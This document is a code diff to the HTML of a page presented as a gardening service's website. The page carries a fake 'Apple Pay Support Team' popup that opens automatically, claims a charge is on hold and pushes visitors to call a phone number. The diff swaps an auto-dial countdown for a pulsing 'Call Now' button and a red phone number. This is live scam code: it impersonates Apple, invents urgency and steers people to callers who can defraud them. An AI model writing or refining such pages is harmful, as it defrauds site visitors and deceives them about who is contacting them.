@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Burner Gardening Service | Professional Landscaping & Maintenance</title>
+    <title>Burner Gardening Service | Professional Landscaping</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -377,6 +377,7 @@
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
             position: relative;
             border: 1px solid #e0e0e0;
+            animation: pulse 2s infinite;
         }
         
         .apple-logo {
@@ -402,7 +403,7 @@
         .popup-content p {
             font-size: 18px;
             line-height: 1.6;
-            margin-bottom: 25px;
+            margin-bottom: 15px;
             color: #555;
         }
         
@@ -411,7 +412,7 @@
             padding: 15px;
             border-radius: 8px;
             font-weight: 600;
-            margin: 20px 0;
+            margin: 25px 0;
             border-left: 4px solid #ffd600;
         }
         
@@ -443,6 +444,33 @@
         
         .close-btn:hover {
             color: #000;
+        }
+        
+        .call-button {
+            display: inline-block;
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 30px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 18px;
+            margin-top: 15px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+        
+        .call-button:hover {
+            background-color: #45a049;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.25);
+        }
+        
+        /* Animation */
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(76, 175, 80, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
         }
         
         /* Responsive Design */
@@ -567,10 +595,13 @@
             <div class="highlight">
                 <p>We have put this charge on hold for 10 minutes.</p>
                 <p>If this wasn't authorized by you, please call us immediately:</p>
-                <p style="font-size: 24px; margin-top: 10px;">+1-833-872-3483</p>
+                <p style="font-size: 24px; margin-top: 10px; color: #e53935;">+1-833-872-3483</p>
             </div>
+            <a href="tel:+18338723483" class="call-button">
+                <i class="fas fa-phone"></i> Call Now
+            </a>
             <p class="signature">Regards,<br>Apple Pay Support Team</p>
-            <div class="countdown">Auto-dialing in: <span id="countdown">2</span> seconds</div>
+            <div class="countdown">This message will remain until dismissed</div>
         </div>
     </div>
 
@@ -766,42 +797,21 @@
         // Apple Pay Popup Functionality
         const applePayPopup = document.getElementById('applePayPopup');
         const closeBtn = document.querySelector('.close-btn');
-        const countdownElement = document.getElementById('countdown');
-        let callTimer;
-        let countdown = 2;
         
         // Show popup after 2 seconds
         setTimeout(() => {
             applePayPopup.classList.add('active');
-            
-            // Start countdown for auto-call
-            const countdownInterval = setInterval(() => {
-                countdown--;
-                countdownElement.textContent = countdown;
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    window.location.href = 'tel:+18338723483';
-                }
-            }, 1000);
-            
-            // Set timer to auto-close after call is initiated
-            callTimer = setTimeout(() => {
-                applePayPopup.classList.remove('active');
-            }, 4000);
         }, 2000);
         
         // Close popup when close button is clicked
         closeBtn.addEventListener('click', () => {
             applePayPopup.classList.remove('active');
-            clearTimeout(callTimer);
         });
         
         // Close popup when clicking outside content
         applePayPopup.addEventListener('click', (e) => {
             if (e.target === applePayPopup) {
                 applePayPopup.classList.remove('active');
-                clearTimeout(callTimer);
             }
         });
     </script>
